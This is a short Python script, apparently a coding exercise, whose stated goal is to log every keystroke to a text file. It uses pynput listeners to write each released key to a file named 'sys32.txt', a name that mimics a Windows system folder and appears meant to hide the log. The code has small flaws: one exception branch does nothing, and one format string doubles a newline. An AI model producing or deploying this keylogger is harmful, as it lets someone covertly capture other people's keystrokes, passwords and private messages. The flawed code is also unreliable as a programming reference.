"""
Goal:
Build a Python script that listens for keyboard presses and logs each key to a text file in real time.
"""
from pynput import keyboard

file_path = "sys32.txt"

def on_press(key, injected):
    try:
        print('alphanumeric key {} pressed; it was {}\n'.format(
                key.char, 'faked' if injected else 'not faked'))
    except AttributeError:
            ('special key {} pressed'.format(
                key))

def on_release(key, injected):
    with open(file_path, 'a') as f:
        key_re = ('{} released; it was {}\n'.format(
            key, 'faked' if injected else 'not faked\n'))
        f.write(key_re)
        if key == keyboard.Key.esc:
            # Stop listener
            return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()